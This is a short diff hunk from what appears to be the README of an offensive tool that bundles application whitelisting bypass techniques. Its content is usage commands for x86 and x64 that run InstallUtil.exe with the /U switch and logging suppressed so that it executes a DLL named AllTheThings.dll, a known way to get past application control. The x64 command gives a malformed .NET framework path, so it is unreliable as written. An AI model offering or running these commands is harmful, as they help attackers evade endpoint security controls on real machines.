@@ -17,7 +17,6 @@ Includes 5 Known Application Whitelisting/ Applicaoitn Control Bypass Techinique
 
 Usage:
 1. 
-
     x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
 
     x64 - C:\Windows\Microsoft.NET\Framework\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
